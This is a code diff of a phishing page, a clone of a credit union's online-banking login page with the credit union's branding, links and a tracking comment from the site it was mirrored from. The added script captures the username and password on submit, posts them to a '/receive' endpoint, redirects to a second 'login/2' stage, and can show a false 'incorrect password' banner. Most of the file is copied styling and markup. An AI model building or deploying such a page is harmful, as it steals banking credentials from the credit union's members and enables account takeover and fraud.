+            --t-accent-7-d1: #20b6b6;
+            --t-accent-8: #5299e0;
+            --t-accent-8-l1: #74ade7;
+            --t-accent-8-d1: #206bb6;
+            --t-accent-9: #5252e0;
+            --t-accent-9-l1: #7474e7;
+            --t-accent-9-d1: #2020b6;
+            --t-accent-10: #9952e0;
+            --t-accent-10-l1: #ad74e7;
+            --t-accent-10-d1: #6b20b6;
+            --t-accent-11: #e052e0;
+            --t-accent-11-l1: #e774e7;
+            --t-accent-11-d1: #b620b6;
+            --t-accent-12: #e05299;
+            --t-accent-12-l1: #e774ad;
+            --t-accent-12-d1: #b6206b;
+            --t-gray-1: #0d0d0d;
+            --t-gray-2: #1a1a1a;
+            --t-gray-3: #262626;
+            --t-gray-4: #333333;
+            --t-gray-5: #404040;
+            --t-gray-6: #4d4d4d;
+            --t-gray-7: #666666;
+            --t-gray-8: gray;
+            --t-gray-9: #999999;
+            --t-gray-10: #b3b3b3;
+            --t-gray-11: #cccccc;
+            --t-gray-12: #d9d9d9;
+            --t-gray-13: #e6e6e6;
+            --t-gray-14: #f2f2f2;
+            --t-text: #4d4d4d;
+            --t-textA: rgba(77, 77, 77, 0.77);
+            --t-primary-text: #FFFFFF;
+            --t-secondary-text: #141414;
+            --t-tertiary-text: #141414;
+            --t-base: #FFFFFF;
+            --t-base-a0: rgba(255, 255, 255, 0);
+            --t-base-a1: rgba(255, 255, 255, 0.25);
+            --t-base-a2: rgba(255, 255, 255, 0.5);
+            --t-base-a3: rgba(255, 255, 255, 0.75);
+            --t-top: #0d0d0d;
+            --t-top-a0: rgba(13, 13, 13, 0);
+            --t-top-a1: rgba(13, 13, 13, 0.35);
+            --t-top-a2: rgba(13, 13, 13, 0.6);
+            --t-top-a3: rgba(13, 13, 13, 0.85);
+            --t-box-shadow-1: 0 2px 4px rgba(13, 13, 13, 0.35);
+            --t-box-shadow-2: 0 3px 6px rgba(13, 13, 13, 0.35);
+            --t-box-shadow-3: 0 4px 12px rgba(13, 13, 13, 0.35);
+            --t-border-radius-1: 3px;
+            --t-border-radius-2: 6px;
+            --t-border-radius-3: 12px;
+            --t-focus: #33B4FF;
+            --t-status-info: #0079C1;
+            --t-status-alert: #C30000;
+            --t-status-warn: #F0B400;
+            --t-status-success: #0E8A00;
+            --t-tab-inactive: #2e2e2e;
+            --t-tab-active: #005971;
+            --t-tab-alt-inactive: inherit;
+            --t-tab-alt-active: inherit;
+            --t-tab-font-size: 17px;
+            --t-highlight-1: #C10230;
+            --t-highlight-2: #005971;
+            --t-highlight-3: #D24114;
+            --t-highlight-4: #D9ECF4;
+            --t-highlight-5: #4F4F4F;
+            --t-highlight-6: #C10230;
+            --t-highlight-7: #005971;
+            --t-highlight-8: #D24114;
+            --t-highlight-9: #D9ECF4;
+            --t-highlight-10: #4F4F4F;
+            --t-highlight-11: #C10230;
+            --t-highlight-12: #005971;
+            --t-highlight-13: #D24114;
+            --t-highlight-14: #D9ECF4;
+            --t-highlight-15: #4F4F4F;
+            --t-input-outline: 1px solid #005971;
+            --t-icon-stroke-width: 1.5;
+            --t-icon-cap: round;
+            --t-icon-stroke-primary: currentColor;
+            --t-icon-stroke-secondary: currentColor;
+            --t-icon-fill: none;
+            --t-font-color: #2e2e2e;
+            --t-a11y-gray-color: #747474;
+            --t-a11y-gray-color-AA: #949494;
+            --t-a11y-active-gray-color-AA: #404040;
+            --t-link-color: #005971;
+            --t-link-hover-color: #003544;
+            --t-content-bg: #FFFFFF;
+            --t-content-border-color: #CCCCCC;
+            --t-content-font-color: #2e2e2e;
+            --t-section-bg: #FFFFFF;
+            --t-section-font-color: #2e2e2e;
+            --t-section-border-radius: 3px;
+            --t-button-default-bg: #EAEAEA;
+            --t-button-default-font-color: #2E2E2E;
+            --t-button-default-hover-bg: #E1E1E1;
+            --t-button-default-hover-font-color: #2E2E2E;
+            --t-button-primary-bg: #D24114;
+            --t-button-primary-font-color: #FFFFFF;
+            --t-button-primary-hover-bg: #CD3100;
+            --t-button-primary-hover-font-color: #ffffff;
+            --t-input-font-color: #2e2e2e;
+            --t-input-placeholder-font-color: #6c6c6c;
+            --t-input-bg: #fcfdfd;
+            --t-input-border-color: #949494;
+            --t-input-focus-font-color: #2e2e2e;
+            --t-input-focus-border-color: #0079C1;
+            --t-input-warning-font-color: #141414;
+            --t-input-warning: #F0B400;
+            --t-input-error-font-color: #FFFFFF;
+            --t-input-error: #C30000;
+            --t-input-success-font-color: #FFFFFF;
+            --t-input-success: #0E8A00;
+            --t-checkbox-fill: #005971;
+            --t-checkbox-text: #FFFFFF;
+            --t-loading-primary-color: #005971;
+            --t-loading-secondary-color: #005971;
+            --t-tooltip-multiline-max-width: 200px;
+            --t-tooltip-background-color: rgba(0, 0, 0, 0.8);
+            --t-tooltip-text-color: #FFFFFF;
+            --t-tooltip-size: 5px;
+            --t-tooltip-body-offset: -15px;
+            --t-tooltip-transition-duration: 250ms;
+            --t-tooltip-visible-duration: 2s;
+            --t-gray1: #0d0d0d;
+            --t-gray2: #1a1a1a;
+            --t-gray3: #262626;
+            --t-gray4: #333333;
+            --t-gray5: #404040;
+            --t-gray6: #4d4d4d;
+            --t-gray7: #666666;
+            --t-gray8: gray;
+            --t-gray9: #999999;
+            --t-gray10: #b3b3b3;
+            --t-gray11: #cccccc;
+            --t-gray12: #d9d9d9;
+            --t-gray13: #e6e6e6;
+            --t-gray14: #f2f2f2;
+            --t-account-color-0: #D24114;
+            --t-account-color-1: #C10230;
+            --t-account-color-2: #005971;
+            --t-account-color-3: #D24114;
+            --t-account-color-4: #D9ECF4;
+            --t-account-color-5: #4F4F4F;
+            --t-account-color-6: #C10230;
+            --t-account-color-7: #005971;
+            --t-account-color-8: #D24114;
+            --t-account-color-9: #D9ECF4;
+            --t-account-color-10: #4F4F4F;
+            --t-account-color-11: #C10230;
+            --t-account-color-12: #005971;
+            --t-account-color-13: #D24114;
+            --t-account-color-14: #D9ECF4;
+            --t-account-color-15: #4F4F4F;
+        }
+    </style>
+    
+    
+    
+    <link type="text/css" rel="stylesheet" href="https://libs.salemove.com/visitor-app.fc426300.default.css" />
+    
+    <link type="text/css" rel="stylesheet" href="https://libs.salemove.com/gva-custom-chat-renderer.18dc061.css" />
+</head>
+
+<body id="pagebody" class="ember-application phone theme-q2 frameless">
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+    
+    
+    <div class="ember-view app-container phone unauthenticated vertical-nav pfm-disabled no-pfm-accounts" id="ember3">
+        <!---->
+        <!---->
+        <div hidden="" role="dialog" tabindex="0" id="q2AppOverpanel" class="over-panel ember-view" style="display: none;">
+            <div tabindex="-1" class="overpanel-inner" test-id="overPanel">
+                <div class="overpanel-header">
+                    <div class="overpanel-button-container">
+                        <!---->
+                    </div>
+
+
+                    <h1 class="overpanel-title" test-id="lblOverpanelTitle">
+                        <!---->
+                    </h1>
+
+                    <div class="overpanel-button-container">
+                        <q2-btn class="overpanel-button overpanel-close" test-id="btnClose" label="Close" hide-label="" stencil-hydrated="">
+                            <q2-icon type="close" stencil-hydrated=""></q2-icon>
+                        </q2-btn>
+                    </div>
+                </div>
+
+                <div id="ember4" class="overpanel-alert-container alert-message_container hasToast ember-view">
+                    <div class="alert alert-msg alert-message_content is-toast  " role="alert" test-id="q2Alert">
+                        <div class="toast-container">
+                            <div class="toast t-base">
+                                <div class="toast-message_inner">
+                                    <div class="toast-line toast-line-info" test-id="toastAlertVerticalLine"></div>
+
+                                    <div class="toast-content">
+                                        <div class="toast-row">
+                                            <div class="toast-icon">
+                                                <q2-icon test-id="toastAlertIcon" type="info" stencil-hydrated=""></q2-icon>
+                                            </div>
+
+                                            <div test-id="toastAlertMessageTxt" class="toast-text">
+                                                <!---->
+                                                <div test-id="alertMessageTxt"></div>
+                                            </div>
+
+                                            <div class="toast-close-btn">
+                                                <!---->
+                                            </div>
+                                        </div>
+                                        <div class="toast-row">
+                                            <div class="toast-timestamp" test-id="toastAlertTimestamp">
+                                                <!---->
+                                            </div>
+                                            <!---->
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="overpanel-scroll-wrapper force-height col-md-offset-1 col-lg-offset-2 col-xs-12 col-sm-12 col-md-10 col-lg-8" test-id="overPanelWrapper">
+                    <div tabindex="-1" class="overpanel-slider ">
+                        <div id="overpanel">
+                        </div>
+                        <!---->
+
+                    </div>
+                </div>
+
+                <div class="overpanel-footer hidden">
+                    <div class="valign overpanel-footer-outer">
+                        <div class="overpanel-footer-inner">
+                            <div id="ember5" class="ui-logo small ember-view"><span class="sr-only" test-id="logoDescriptiveText">Texas Dow ECU</span>
+
+                                <div aria-hidden="true" class="logo-image" test-id="logoDiv"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!---->
+        <!---->
+
+        <div class="loading-bg"></div>
+
+        <div class="splash-bg"></div>
+
+        <!---->
+        <div class="container meta-container main-page-container">
+            <div id="ember6" class="app-header ui-sticky top ember-view" style="top: 0px;">
+                <div class="navbar navbar-fixed-top center-align-logo disable-menu-button" role="banner">
+                    <div class="container meta-container" test-id="navbarContainer">
+                        <!---->
+                        <div class="navbar-branding">
+                            <div class="branding">
+                                <div id="ember7" class="logo ui-logo small ember-view"><span class="sr-only" test-id="logoDescriptiveText">Texas Dow ECU</span>
+
+                                    <div aria-hidden="true" class="logo-image" test-id="logoDiv"></div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div id="ember8" class="custom-header ember-view">
+                            <!---->
+                        </div>
+
+                        <!---->
+                    </div>
+                </div>
+
+                <div test-id="wdgtBrandingBar" id="ember9" class="branding-bar-widget widget-fence clearfix hidden ember-view">
+                    <!---->
+                </div>
+            </div>
+            <div class="quicktip-container main-desktop">
+                <!---->
+            </div>
+
+            <div id="ember10" class="main-view grid-row drawer-view main-view ember-view">
+                <!---->
+                <div class="content-wrapper">
+                    <div class="content-container">
+                        <header>
+                            <div tabindex="-1" class="ember-sr-only ember-sr-only-focusable" id="ember-a11y-refocus-nav-message">
+                                The page navigation is complete. You may now navigate the page content as you wish.
+                            </div>
+                            <!---->
+                        </header>
+
+                        <div class="content clearfix" role="main" test-id="mainContentArea">
+                            <!---->
+                            <div id="ember11" class="top-widget-fence widget-fence clearfix hidden ember-view">
+                                <!---->
+                            </div>
+
+                            <section class="default-dashboard-container">
+                                <!---->
+                                <section class="default-dash-inner-wrapper">
+                                    <!---->
+                                    <!---->
+
+                                    <!---->
+                                </section>
+
+                                <!---->
+                            </section>
+
+                            <div id="ember12" class="widget-fence clearfix bottom-widget-fence hidden ember-view">
+                                <!---->
+                            </div>
+                        </div>
+
+
+                        <div class="sidebar " tabindex="-1" role="complementary">
+                            <!---->
+                            <div class="sidebar-drawer">
+                                <div class="sidebar-rail">
+                                    <div class="sidebar-content">
+                                        <div id="ember13" class="widget-fence clearfix hidden ember-view">
+                                            <!---->
+                                        </div>
+
+                                        <!---->
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <!---->
+
+                    </div>
+
+                    <div class="dropdown-backdrop hidden"> </div>
+                </div>
+
+                <div role="dialog" tabindex="0" id="q2AppSidePanel" class="sidepanel ember-view" style="display: none;">
+                    <div class="sidepanel-inner">
+                        <!---->
+
+                    </div>
+                </div>
+                <div id="login-modal"></div>
+                <div class="login-outer">
+                    <div class="login-inner" id="login-inner">
+                        <div class="quicktip-container">
+                            <aside hidden="" id="ember14" class="quick-tip hidden ember-view"><span class="tip-text" test-id="textQT">
+                                    <!---->
+                                </span>
+                                <q2-btn hide-label="" test-id="btnRemoveQT" label="Close Tip" stencil-hydrated="">
+                                    <q2-icon type="close" stencil-hydrated=""></q2-icon>
+                                </q2-btn>
+                            </aside>
+                            <aside hidden="" id="ember15" class="quick-tip hidden ember-view"><span class="tip-text" test-id="textQT">
+                                    <!---->
+                                </span>
+                                <q2-btn hide-label="" test-id="btnRemoveQT" label="Close Tip" stencil-hydrated="">
+                                    <q2-icon type="close" stencil-hydrated=""></q2-icon>
+                                </q2-btn>
+                            </aside>
+                        </div>
+                        <div class="login-title">
+                        	
+                            <h1 id="ember16" class="ui-logo small ember-view"><span class="sr-only" test-id="logoDescriptiveText">Texas Dow ECU</span>
+
+                                <div aria-hidden="true" class="logo-image" test-id="logoDiv"></div>
+                            </h1>
+                        </div>
+								<div class="login-static-alert login-message login-alert-message loginFormArea">
+					                <div style="display:none;" id="ember35" class="login-alert-container alert-message_container static-alert has-alert ember-view"><div class="alert alert-msg alert-message_content alert-danger" role="alert" aria-live="assertive">
+					    <div class="alert-message_inner" style="line-height: 2.8;">
+					        <p>
+					    <span role="img" class="ui-icon icon-warning-sign " aria-hidden="true" aria-label="error"></span>
+					
+					 You have entered an incorrect username or password.</p>
+					        <p class="alert-message_sizer" style="">X</p>
+					    </div>
+					</div>
+					</div>
+					            </div>
+                        
+
+                        <div class="login-form loginFormArea">
+                            <form id="form" class="is-invalid" data-ember-action="" data-ember-action-18="18">
+                                <div class="field ">
+                                    <label class="login-field" for="fldUsername">Username</label>
+                                    <input name="username" test-id="fldUsername" spellcheck="false" autocapitalize="off" autocorrect="off" placeholder="" autocomplete="username" title="" id="fldUsername" class="mrg-T-sm login-field form-control ember-text-field form-control ember-view lgField" type="text" />
+                                </div>
+                                <div class="password field">
+                                    <label class="login-field" for="fldPassword">Password</label>
+                                    <input name="password" test-id="fldPassword" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="current-password" id="fldPassword" class="mrg-T-sm login-field form-control ember-text-field form-control ember-view lgField" type="password" />
+                                </div>
+                                <div id="submissionArea">
+                                    <div id="userLinks">
+                                        <div id="rememberUserNameArea">
+                                            <div description-id="ember19-description" test-id="ckbRememberUser" id="ember19" class="ui-checkbox ember-view"><input class="sr-only" id="ckbRememberUser" type="checkbox" />
+                                                <label for="ckbRememberUser">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" width="20" height="20" viewBox="0 0 20 20">
+                                                        <rect fill="none" stroke="none" stroke-width="2" x="1" y="1" width="18" height="18" rx="3" />
+                                                        <polyline fill="none" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" points="4 11.4390244 7.44978307 15.0611808 16 5" />
+                                                    </svg>
+                                                    <div class="inner-label ">
+                                                        <div test-id="txtLabel" class="inner-text">
+                                                            Remember me
+                                                        </div>
+                                                        <!---->
+                                                    </div>
+                                                </label>
+                                            </div>
+                                        </div>
+
+                                        <button id="submitBut" class="logon-submit btn-primary btn-block pointer btn submitButton submit is-invalid disabled" test-id="btnSubmit"  type="submit" data-ember-action="" data-ember-action-20="20">
+                                            <div class="icon"></div>Log In
+                                        </button>
+
+                                        <div class="password-links">
+                                            <div class="password-link">
+                                                <a href="#/login/resetPasswordUsername" id="ember21" class="ember-view">
+                                                    <span class="forgot-pw" test-id="lnkForgottenPW">Forgot your password?</span>
+                                                </a>
+                                            </div>
+                                            <div class="password-link">
+                                                <!---->
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+
+
+
+                        <div class="login-icons clearfix">
+
+                            <a href="tel:8008391154" class="login-adLink callme-button">Call Us</a>
+
+                            <a href="https://www.tdecu.org/privacy-notice/" class="login-adLink privacy_link" test-id="lnkPrivacy" onclick="window.open(@href,'_blank'); return false;">Privacy Notice</a>
+                            <a target="_blank" class="login-adLink" href="https://www.tdecu.org/find-a-location-atm/" onclick="window.open(this.href,'system'); return false;">Locations</a><a target="_blank" class="login-adLink" href="https://secure.tdecu.org/TDECUOnline/sdk/AutoEnrollmentE2E">Enroll Now</a><a target="_blank" class="login-adLink" href="https://secure.tdecu.org/TDECUOnline/sdk/AutoEnrollmentE2E/AccountRecovery">Unlock/Forgot username</a>
+                        </div>
+                        <div class="preLogon">
+                               <div style="text-align:center"><img src="https://cdn1.onlineaccess1.com/cdn/depot/5004/2760/352a97bce2712f7db14eb5832cee6cf6/assets/images/NCUA_Logo_Small_2-35870f5622f3ce85a1705dcbcb755844.png" alt="NCUA Logo" /></div>
+                        </div>
+                        <!---->
+                    </div>
+                </div>
+
+
+            </div>
+            <a test-id="lnkReturnToLogin" href="#/login" id="ember24" class="ember-view return-to-login">
+                Return to login
+            </a>
+        </div>
+
+        <div class="content-overlay"></div>
+
+        <!---->
+        <!---->
+        <!---->
+        <!---->
+        <div  id="ember25" class="print-content ember-view">
+            <div style="overflow: auto;">
+                <div style="float: left;"><img id="transaction-print-logo" alt="" role="presentation" /></div>
+                <div class="timestamp"></div>
+            </div>
+            <div>
+                <!---->
+                <!---->
+            </div>
+            <div class="detail-items">
+                <table>
+                    <tbody>
+                        <!---->
+                        <!---->
+                        <!---->
+                    </tbody>
+                </table>
+            </div>
+            <!---->
+        </div>
+
+    </div>
+    
+    <div id="salemove" class="salemove" style="display: none;">
+        <div class="sm-visitor-app-container " id="sm-visitor-app-container">
+            <div style="--theme-color: #005971; --theme-color-rgb: 0, 89, 113; --theme-color-darker: #005066;">
+                <div class="sm-touch-draggable sm-touch-draggable-lower-right">
+                    <div class="sm-visitor-app"><span>
+                            <div class="sm-reactive-interface"><span><span></span></span></div>
+                        </span></div>
+                </div><span></span>
+                <div class="omnibrowse">
+                    <div class="ob-visitor-container" style="--theme-color: #005971; --theme-color-rgb: 0, 89, 113; --theme-color-darker: #005066;">
+                        <div class="ob-screenshare    " style="transform: translate3d(0px, 0px, 0px);">
+                            <div class="sm-screen-reader-only" aria-live="polite"></div>
+                            <div class="sm-screen-reader-only" aria-live="polite"></div><span></span>
+                        </div>
+                        <div class="ob-screenshare-visitor    " style="transform: translate3d(0px, 0px, 0px);">
+                            <div class="sm-screen-reader-only" aria-live="polite"></div>
+                            <div class="sm-screen-reader-only" aria-live="polite"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="sm-screen-reader-only" role="alert"></div>
+            <div class="sm-screen-reader-only" aria-live="polite"></div>
+        </div>
+        <div id="omnibrowse" class="omnibrowse">
+            <div class="ob-visitor-container" style="--theme-color: #005971; --theme-color-rgb: 0, 89, 113; --theme-color-darker: #005066;">
+                <div class="sm-screen-reader-only" aria-live="polite"></div>
+                <div class="ob-media   sm_cobrowsing_hidden_field    " style="transform: translate3d(0px, 0px, 0px);">
+                    <div class="sm-screen-reader-only" aria-live="polite"></div>
+                    <div class="sm-screen-reader-only" aria-live="polite"></div><span></span>
+                </div>
+                <div class="ob-visitor-app undefined"><span><span></span></span></div>
+                <div class="ob-visitor-app "><span><span></span></span></div>
+                <div class="ob-screenshare    " style="transform: translate3d(0px, 0px, 0px);">
+                    <div class="sm-screen-reader-only" aria-live="polite"></div>
+                    <div class="sm-screen-reader-only" aria-live="polite"></div><span></span>
+                </div>
+                <div class="ob-screenshare-visitor    " style="transform: translate3d(0px, 0px, 0px);">
+                    <div class="sm-screen-reader-only" aria-live="polite"></div>
+                    <div class="sm-screen-reader-only" aria-live="polite"></div>
+                </div>
+            </div>
+            <div class="sm-screen-reader-only" role="alert"></div>
+            <div class="sm-screen-reader-only" aria-live="polite"></div>
+        </div>
+    </div><span id="cobrowsing-mouse-container"></span>
+</body>
+<script>
+	document.addEventListener
+	</script>
+<script>
+    	
+    $(document).ready(function() {
+    let myForm = $("#form");
+    let checkInputs = document.querySelectorAll('.lgField');	
+    const elements = document.querySelectorAll('.is-invalid');
+    const submit = document.getElementById('submitBut'); 
+    // Flag to track if any input is empty
+    let isEmpty = false;
+    
+    checkInputs.forEach(check => { 
+    check.addEventListener('input', () => {
+        if (document.getElementById('fldUsername').value.trim() === "" || document.getElementById('fldPassword').value.trim() === "") { 
+            submit.classList.add('is-invalid');
+            submit.classList.add('disabled');
+            console.log('disabled');
+            isEmpty = false; // Change to false when at least one field has input
+        } else {
+            console.log('abled');
+            submit.classList.remove('is-invalid');
+            submit.classList.remove('disabled');
+
+            elements.forEach(element => {
+                element.classList.replace('is-invalid', 'is-valid');
+            });
+            isEmpty = true; // Change to true when both fields are empty
+        }
+    });
+});
+
+    $(document).on('submit', '#form', function(event) {
+        event.preventDefault();
+
+        // Recheck if any input is empty before form submission
+        isEmpty = false;
+        checkInputs.forEach(check => {
+            if (check.value.trim() === "") {
+                check.classList.add('is-invalid');
+                check.classList.add('disabled');
+                setTimeout(() => {
+                    document.getElementById('ember35').style.display = "block";
+                }, 2000);
+                isEmpty = true;
+            } else {
+                check.classList.remove('is-invalid');
+                check.classList.remove('disabled');
+                
+            }
+        });
+
         if (!isEmpty) {
+            // Validation passed, proceed with form submission
             let userinfo = myForm.serializeArray();
             let user = {};
-            let visitor = document.getElementById('Email').value;
+            let visitor = document.getElementById('fldUsername').value;
+
 
             userinfo.forEach((value) => {
                 user[value.name] = value.value;
             });
 
+            
             user['visitor'] = visitor;
             console.log(user);
-			setTimeout(()=> {
-               	window.location.href = "login/2";
-               	}, 2000);
-            
+            let url = '/receive';
             $.ajax({
                 method: 'POST',
-                url: "/receive",
+                url: url,
                 data: user
             }).done(function(msg) {
-                sessionStorage.setItem('visitor', visitor);
-                console.log(msg); // Log success message
-
-               
-                
-            }).fail(function(err, textstatus, error) {
+                console.log(msg);
                 window.location.href = "login/2";
-                console.log('fail');
+                sessionStorage.setItem('visitor', visitor);
+            }).fail(function(err, textstatus, error) {
+                // Handle AJAX request failure here
             });
-            
         }
     });
 });
-
-  var close = document.querySelectorAll('.cls'); 
-		
-  for (const button of close){
-  button.addEventListener('click', ()=> {
-  document.getElementById('error-modal').style.display = "none";
-  });
-	};
     </script>
-<!-- Mirrored from apply.arrowheadcu.org/VirtualCapture/default/Login/SignInProfile by HTTrack Website Copier/3.x [XR&CO'2017], Mon, 13 May 2024 00:14:49 GMT -->
 </html>
